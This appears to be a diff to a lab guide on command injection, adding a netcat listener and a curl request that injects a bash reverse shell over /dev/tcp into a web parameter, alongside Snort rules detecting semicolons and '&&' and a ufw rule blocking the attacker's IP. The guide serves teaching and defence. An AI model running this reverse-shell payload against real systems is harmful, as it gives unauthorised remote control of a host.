@@ -28,12 +28,20 @@ google.com; id
 google.com&&id
 ```
 
+```bash
+# Setup a Netcat listener On Kali
+nc nc -lnvp 4444
+
+#  Send request with payload
+curl "http://{dest_id}:{dest_port}/execute?cmd=ping&target=google.com;bash+-c+'bash+-i+>%26+/dev/tcp/{src_ip}/{src_port}+0>%261'"
+```
+
 ### Detecting Semicolons in Input with Snort
 
 To detect semicolons in input, use the following Snort rule:
 
 ```plaintext
-alert tcp $HOME_NET any -> $EXTERNAL_NET 3000 (msg:"Possible command injection attempt - semicolon in input (\;)"; content:"%3B"; nocase; sid:1000001; rev:1;)
+alert tcp any any -> $HOME_NET 3000 (msg:"Possible command injection attempt - semicolon in input (\;)"; content:"|3B|"; nocase; sid:1000001; rev:1;)
 ```
 
 ### Detecting Multiple Commands in Input with Snort
@@ -41,5 +49,23 @@ alert tcp $HOME_NET any -> $EXTERNAL_NET 3000 (msg:"Possible command injection a
 To detect multiple commands in input, use the following Snort rule:
 
 ```plaintext
-alert tcp $HOME_NET any -> $EXTERNAL_NET 3000 (msg:"Possible command injection attempt - multiple commands in input (&&)"; content:"%26%26"; nocase; sid:1000002; rev:1;)
+alert tcp any any -> $HOME_NET 3000 (msg:"Possible command injection attempt - multiple commands in input (&&)"; content:"|26 26|"; nocase; sid:1000002; rev:1;)
+```
+
+### Run Snort
+```
+sudo snort -A console -c /etc/snort/snort.conf
+```
+
+### Deny traffic from Kali on Ubuntu Desktop
+```
+sudo ufw status
+sudo ufw enable
+sudo ufw deny from 192.168.1.114 to any
+sudp ufw status
+```
+
+### Checking all active shell
+```
+
 ```
